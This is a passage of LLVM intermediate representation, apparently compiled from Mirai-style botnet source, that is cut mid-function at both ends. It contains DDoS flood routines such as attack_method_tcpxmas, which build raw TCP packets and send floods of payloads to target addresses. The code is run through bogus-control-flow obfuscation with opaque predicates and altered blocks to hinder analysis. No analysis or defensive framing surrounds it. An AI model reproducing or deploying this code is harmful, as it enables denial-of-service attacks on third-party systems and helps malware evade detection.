  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %274, i32 0, i32 0
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %275, i32 0, i32 2
  %277 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %276, i32 0, i32 0
  store i32 %270, i32* %277, align 4
  br label %278

; <label>:278:                                    ; preds = %252, %243
  %279 = load i32*, i32** %20, align 8
  %280 = load i32, i32* %18, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds i32, i32* %279, i64 %281
  %283 = load i32, i32* %282, align 4
  %284 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %285 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %286 = load i32, i32* %18, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 0
  %290 = bitcast %struct.sockaddr_in* %289 to %struct.sockaddr*
  store %struct.sockaddr* %290, %struct.sockaddr** %284, align 8
  %291 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %292 = load %struct.sockaddr*, %struct.sockaddr** %291, align 8
  %293 = call i32 @connect(i32 %283, %struct.sockaddr* %292, i32 16)
  %294 = icmp eq i32 %293, -1
  br i1 %294, label %295, label %296

; <label>:295:                                    ; preds = %278
  br label %296

; <label>:296:                                    ; preds = %295, %278
  br label %297

; <label>:297:                                    ; preds = %296
  %298 = load i32, i32* @x.19
  %299 = load i32, i32* @y.20
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %297
  %306 = load i32, i32* %18, align 4
  %307 = add nsw i32 %306, 1
  store i32 %307, i32* %18, align 4
  %308 = load i32, i32* @x.19
  %309 = load i32, i32* @y.20
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart2135, label %originalBB122alteredBB

originalBBpart2135:                               ; preds = %originalBB122
  br label %153

; <label>:316:                                    ; preds = %originalBBpart2116
  %317 = load i32, i32* @x.19
  %318 = load i32, i32* @y.20
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %316
  %325 = load i32, i32* @x.19
  %326 = load i32, i32* @y.20
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %333

; <label>:333:                                    ; preds = %359, %originalBBpart2139
  store i32 0, i32* %18, align 4
  br label %334

; <label>:334:                                    ; preds = %356, %333
  %335 = load i32, i32* %18, align 4
  %336 = load i8, i8* %13, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp slt i32 %335, %337
  br i1 %338, label %339, label %359

; <label>:339:                                    ; preds = %334
  %340 = load i32*, i32** %20, align 8
  %341 = load i32, i32* %18, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds i32, i32* %340, i64 %342
  %344 = load i32, i32* %343, align 4
  %345 = load i32, i32* %18, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds [22 x i8*], [22 x i8*]* %17, i64 0, i64 %346
  %348 = load i8*, i8** %347, align 8
  %349 = load i32, i32* %18, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [22 x i8*], [22 x i8*]* %17, i64 0, i64 %350
  %352 = load i8*, i8** %351, align 8
  %353 = call i64 @strlen(i8* %352) #10
  %354 = add i64 %353, 1
  %355 = call i64 @send(i32 %344, i8* %348, i64 %354, i32 16384)
  br label %356

; <label>:356:                                    ; preds = %339
  %357 = load i32, i32* %18, align 4
  %358 = add nsw i32 %357, 1
  store i32 %358, i32* %18, align 4
  br label %334

; <label>:359:                                    ; preds = %334
  br label %333

originalBBalteredBB:                              ; preds = %originalBB, %4
  %360 = alloca i8, align 1
  %361 = alloca %struct.attack_target*, align 8
  %362 = alloca i8, align 1
  %363 = alloca %struct.attack_option*, align 8
  %364 = alloca [22 x i8*], align 16
  %365 = alloca i32, align 4
  %366 = alloca i8**, align 8
  %367 = alloca i32*, align 8
  %368 = alloca i16, align 2
  %369 = alloca i16, align 2
  %370 = alloca i16, align 2
  %371 = alloca i8, align 1
  %372 = alloca %struct.sockaddr_in, align 4
  %373 = alloca %struct.iphdr*, align 8
  %374 = alloca %struct.udphdr*, align 8
  %375 = alloca i8*, align 8
  %376 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %377 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %360, align 1
  store %struct.attack_target* %1, %struct.attack_target** %361, align 8
  store i8 %2, i8* %362, align 1
  store %struct.attack_option* %3, %struct.attack_option** %363, align 8
  %378 = getelementptr inbounds [22 x i8*], [22 x i8*]* %364, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i8** %378, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 1
  %380 = call signext i8 @random_hex()
  %381 = sext i8 %380 to i32
  %382 = call signext i8 @random_hex()
  %383 = sext i8 %382 to i32
  %_ = sub i32 %381, %383
  %gen = mul i32 %_, %383
  %_1 = sub i32 %381, %383
  %gen2 = mul i32 %_1, %383
  %_3 = sub i32 %381, %383
  %gen4 = mul i32 %_3, %383
  %_5 = shl i32 %381, %383
  %_6 = sub i32 %381, %383
  %gen7 = mul i32 %_6, %383
  %_8 = sub i32 0, %381
  %gen9 = add i32 %_8, %383
  %384 = add nsw i32 %381, %383
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i32 0, i32 0), i64 %385
  store i8* %386, i8** %379, align 8
  %387 = getelementptr inbounds i8*, i8** %379, i64 1
  %388 = call signext i8 @random_hex()
  %389 = sext i8 %388 to i32
  %390 = call signext i8 @random_hex()
  %391 = sext i8 %390 to i32
  %_10 = sub i32 %389, %391
  %gen11 = mul i32 %_10, %391
  %_12 = shl i32 %389, %391
  %_13 = sub i32 %389, %391
  %gen14 = mul i32 %_13, %391
  %_15 = shl i32 %389, %391
  %_16 = sub i32 0, %389
  %gen17 = add i32 %_16, %391
  %_18 = sub i32 %389, %391
  %gen19 = mul i32 %_18, %391
  %_20 = sub i32 %389, %391
  %gen21 = mul i32 %_20, %391
  %392 = add nsw i32 %389, %391
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i64 %393
  store i8* %394, i8** %387, align 8
  %395 = getelementptr inbounds i8*, i8** %387, i64 1
  store i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i32 0, i32 0), i8** %395, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 1
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i32 0, i32 0), i8** %396, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i8** %397, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 1
  %399 = call signext i8 @random_hex()
  %400 = sext i8 %399 to i32
  %401 = call signext i8 @random_hex()
  %402 = sext i8 %401 to i32
  %_22 = shl i32 %400, %402
  %_23 = sub i32 0, %400
  %gen24 = add i32 %_23, %402
  %_25 = sub i32 0, %400
  %gen26 = add i32 %_25, %402
  %_27 = sub i32 0, %400
  %gen28 = add i32 %_27, %402
  %_29 = sub i32 %400, %402
  %gen30 = mul i32 %_29, %402
  %403 = add nsw i32 %400, %402
  %404 = call signext i8 @random_hex()
  %405 = sext i8 %404 to i32
  %_31 = sub i32 0, %403
  %gen32 = add i32 %_31, %405
  %_33 = sub i32 %403, %405
  %gen34 = mul i32 %_33, %405
  %406 = add nsw i32 %403, %405
  %407 = call signext i8 @random_hex()
  %408 = sext i8 %407 to i32
  %_35 = sub i32 %406, %408
  %gen36 = mul i32 %_35, %408
  %_37 = sub i32 0, %406
  %gen38 = add i32 %_37, %408
  %_39 = sub i32 0, %406
  %gen40 = add i32 %_39, %408
  %_41 = sub i32 %406, %408
  %gen42 = mul i32 %_41, %408
  %_43 = sub i32 %406, %408
  %gen44 = mul i32 %_43, %408
  %409 = add nsw i32 %406, %408
  %410 = call signext i8 @random_hex()
  %411 = sext i8 %410 to i32
  %_45 = shl i32 %409, %411
  %_46 = shl i32 %409, %411
  %_47 = shl i32 %409, %411
  %412 = add nsw i32 %409, %411
  %413 = call signext i8 @random_hex()
  %414 = sext i8 %413 to i32
  %_48 = sub i32 0, %412
  %gen49 = add i32 %_48, %414
  %415 = add nsw i32 %412, %414
  %416 = call signext i8 @random_hex()
  %417 = sext i8 %416 to i32
  %_50 = sub i32 %415, %417
  %gen51 = mul i32 %_50, %417
  %_52 = shl i32 %415, %417
  %_53 = sub i32 0, %415
  %gen54 = add i32 %_53, %417
  %418 = add nsw i32 %415, %417
  %419 = call signext i8 @random_hex()
  %420 = sext i8 %419 to i32
  %_55 = sub i32 0, %418
  %gen56 = add i32 %_55, %420
  %_57 = sub i32 %418, %420
  %gen58 = mul i32 %_57, %420
  %_59 = shl i32 %418, %420
  %_60 = sub i32 0, %418
  %gen61 = add i32 %_60, %420
  %_62 = sub i32 0, %418
  %gen63 = add i32 %_62, %420
  %_64 = shl i32 %418, %420
  %_65 = sub i32 0, %418
  %gen66 = add i32 %_65, %420
  %421 = add nsw i32 %418, %420
  %422 = call signext i8 @random_hex()
  %423 = sext i8 %422 to i32
  %_67 = sub i32 %421, %423
  %gen68 = mul i32 %_67, %423
  %_69 = sub i32 0, %421
  %gen70 = add i32 %_69, %423
  %_71 = shl i32 %421, %423
  %_72 = shl i32 %421, %423
  %_73 = shl i32 %421, %423
  %424 = add nsw i32 %421, %423
  %425 = call signext i8 @random_hex()
  %426 = sext i8 %425 to i32
  %_74 = sub i32 0, %424
  %gen75 = add i32 %_74, %426
  %427 = add nsw i32 %424, %426
  %428 = call signext i8 @random_hex()
  %429 = sext i8 %428 to i32
  %_76 = shl i32 %427, %429
  %_77 = sub i32 %427, %429
  %gen78 = mul i32 %_77, %429
  %_79 = shl i32 %427, %429
  %_80 = shl i32 %427, %429
  %_81 = sub i32 0, %427
  %gen82 = add i32 %_81, %429
  %_83 = sub i32 0, %427
  %gen84 = add i32 %_83, %429
  %_85 = sub i32 0, %427
  %gen86 = add i32 %_85, %429
  %_87 = sub i32 0, %427
  %gen88 = add i32 %_87, %429
  %430 = add nsw i32 %427, %429
  %431 = call signext i8 @random_hex()
  %432 = sext i8 %431 to i32
  %_89 = sub i32 %430, %432
  %gen90 = mul i32 %_89, %432
  %_91 = sub i32 0, %430
  %gen92 = add i32 %_91, %432
  %_93 = shl i32 %430, %432
  %_94 = sub i32 %430, %432
  %gen95 = mul i32 %_94, %432
  %_96 = sub i32 %430, %432
  %gen97 = mul i32 %_96, %432
  %433 = add nsw i32 %430, %432
  %434 = call signext i8 @random_hex()
  %435 = sext i8 %434 to i32
  %_98 = shl i32 %433, %435
  %_99 = sub i32 0, %433
  %gen100 = add i32 %_99, %435
  %_101 = shl i32 %433, %435
  %_102 = sub i32 0, %433
  %gen103 = add i32 %_102, %435
  %436 = add nsw i32 %433, %435
  %437 = call signext i8 @random_hex()
  %438 = sext i8 %437 to i32
  %_104 = sub i32 %436, %438
  %gen105 = mul i32 %_104, %438
  %_106 = shl i32 %436, %438
  %_107 = shl i32 %436, %438
  %_108 = sub i32 %436, %438
  %gen109 = mul i32 %_108, %438
  %_110 = sub i32 %436, %438
  %gen111 = mul i32 %_110, %438
  %_112 = sub i32 0, %436
  %gen113 = add i32 %_112, %438
  %439 = add nsw i32 %436, %438
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds i8, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.6, i32 0, i32 0), i64 %440
  store i8* %441, i8** %398, align 8
  %442 = getelementptr inbounds i8*, i8** %398, i64 1
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i32 0, i32 0), i8** %442, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 1
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8** %443, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 1
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i32 0, i32 0), i8** %444, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 1
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i32 0, i32 0), i8** %445, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 1
  store i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i32 0, i32 0), i8** %446, align 8
  %447 = getelementptr inbounds i8*, i8** %446, i64 1
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i32 0, i32 0), i8** %447, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 1
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i32 0, i32 0), i8** %448, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i32 0, i32 0), i8** %449, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 1
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8** %450, align 8
  %451 = getelementptr inbounds i8*, i8** %450, i64 1
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8** %451, align 8
  %452 = getelementptr inbounds i8*, i8** %451, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i32 0, i32 0), i8** %452, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 1
  store i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i32 0, i32 0), i8** %453, align 8
  %454 = getelementptr inbounds i8*, i8** %453, i64 1
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i32 0, i32 0), i8** %454, align 8
  %455 = getelementptr inbounds i8*, i8** %454, i64 1
  store i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8** %455, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 1
  store i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i32 0, i32 0), i8** %456, align 8
  %457 = load i8, i8* %360, align 1
  %458 = zext i8 %457 to i64
  %459 = call noalias i8* @calloc(i64 %458, i64 8) #7
  %460 = bitcast i8* %459 to i8**
  store i8** %460, i8*** %366, align 8
  %461 = load i8, i8* %360, align 1
  %462 = zext i8 %461 to i64
  %463 = call noalias i8* @calloc(i64 %462, i64 4) #7
  %464 = bitcast i8* %463 to i32*
  store i32* %464, i32** %367, align 8
  %465 = load i8, i8* %362, align 1
  %466 = load %struct.attack_option*, %struct.attack_option** %363, align 8
  %467 = call i32 @attack_get_opt_int(i8 zeroext %465, %struct.attack_option* %466, i8 zeroext 7, i32 65535)
  %468 = trunc i32 %467 to i16
  store i16 %468, i16* %368, align 2
  %469 = load i8, i8* %362, align 1
  %470 = load %struct.attack_option*, %struct.attack_option** %363, align 8
  %471 = call i32 @attack_get_opt_int(i8 zeroext %469, %struct.attack_option* %470, i8 zeroext 6, i32 65535)
  %472 = trunc i32 %471 to i16
  store i16 %472, i16* %369, align 2
  %473 = load i8, i8* %362, align 1
  %474 = load %struct.attack_option*, %struct.attack_option** %363, align 8
  %475 = call i32 @attack_get_opt_int(i8 zeroext %473, %struct.attack_option* %474, i8 zeroext 0, i32 1024)
  %476 = trunc i32 %475 to i16
  store i16 %476, i16* %370, align 2
  %477 = load i8, i8* %362, align 1
  %478 = load %struct.attack_option*, %struct.attack_option** %363, align 8
  %479 = call i32 @attack_get_opt_int(i8 zeroext %477, %struct.attack_option* %478, i8 zeroext 1, i32 1)
  %480 = trunc i32 %479 to i8
  store i8 %480, i8* %371, align 1
  %481 = bitcast %struct.sockaddr_in* %372 to i8*
  call void @llvm.memset.p0i8.i64(i8* %481, i8 0, i64 16, i32 4, i1 false)
  %482 = load i16, i16* %369, align 2
  %483 = zext i16 %482 to i32
  %484 = icmp eq i32 %483, 65535
  br label %originalBB

originalBB114alteredBB:                           ; preds = %originalBB114, %153
  %485 = load i32, i32* %18, align 4
  %486 = load i8, i8* %13, align 1
  %487 = zext i8 %486 to i32
  %488 = icmp slt i32 %485, %487
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %226
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %297
  %489 = load i32, i32* %18, align 4
  %_123 = sub i32 %489, 1
  %gen124 = mul i32 %_123, 1
  %_125 = sub i32 %489, 1
  %gen126 = mul i32 %_125, 1
  %_127 = sub i32 0, %489
  %gen128 = add i32 %_127, 1
  %_129 = sub i32 %489, 1
  %gen130 = mul i32 %_129, 1
  %_131 = sub i32 %489, 1
  %gen132 = mul i32 %_131, 1
  %_133 = shl i32 %489, 1
  %490 = add nsw i32 %489, 1
  store i32 %490, i32* %18, align 4
  br label %originalBB122

originalBB137alteredBB:                           ; preds = %originalBB137, %316
  br label %originalBB137
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @random_hex() #0 {
  %1 = load i32, i32* @x.21
  %2 = load i32, i32* @y.22
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [256 x i8], align 16
  %10 = alloca i32, align 4
  %11 = bitcast [256 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %11, i8* getelementptr inbounds ([256 x i8], [256 x i8]* @random_hex.hexs, i32 0, i32 0), i64 256, i32 16, i1 false)
  store i32 256, i32* %10, align 4
  %12 = call i32 @rand() #7
  %13 = load i32, i32* %10, align 4
  %14 = add nsw i32 %13, 1
  %15 = srem i32 %12, %14
  %16 = trunc i32 %15 to i8
  %17 = load i32, i32* @x.21
  %18 = load i32, i32* @y.22
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8 %16

originalBBalteredBB:                              ; preds = %originalBB, %0
  %25 = alloca [256 x i8], align 16
  %26 = alloca i32, align 4
  %27 = bitcast [256 x i8]* %25 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %27, i8* getelementptr inbounds ([256 x i8], [256 x i8]* @random_hex.hexs, i32 0, i32 0), i64 256, i32 16, i1 false)
  store i32 256, i32* %26, align 4
  %28 = call i32 @rand() #7
  %29 = load i32, i32* %26, align 4
  %_ = shl i32 %29, 1
  %_1 = sub i32 %29, 1
  %gen = mul i32 %_1, 1
  %_2 = shl i32 %29, 1
  %_3 = sub i32 %29, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 0, %29
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 %29, 1
  %gen8 = mul i32 %_7, 1
  %30 = add nsw i32 %29, 1
  %_9 = sub i32 %28, %30
  %gen10 = mul i32 %_9, %30
  %_11 = sub i32 %28, %30
  %gen12 = mul i32 %_11, %30
  %_13 = sub i32 0, %28
  %gen14 = add i32 %_13, %30
  %_15 = shl i32 %28, %30
  %_16 = shl i32 %28, %30
  %_17 = shl i32 %28, %30
  %31 = srem i32 %28, %30
  %32 = trunc i32 %31 to i8
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #7
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %122

; <label>:105:                                    ; preds = %4
  %106 = load i32, i32* @x.23
  %107 = load i32, i32* @y.24
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %105
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %863

; <label>:122:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %123 = load i32, i32* %10, align 4
  %124 = bitcast i32* %9 to i8*
  %125 = call i32 @setsockopt(i32 %123, i32 0, i32 3, i8* %124, i32 4) #7
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %130

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %10, align 4
  %129 = call i32 @close(i32 %128)
  br label %863

; <label>:130:                                    ; preds = %122
  %131 = load i32, i32* @x.23
  %132 = load i32, i32* @y.24
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %130
  store i32 0, i32* %9, align 4
  %139 = load i32, i32* @x.23
  %140 = load i32, i32* @y.24
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %147

; <label>:147:                                    ; preds = %716, %originalBBpart24
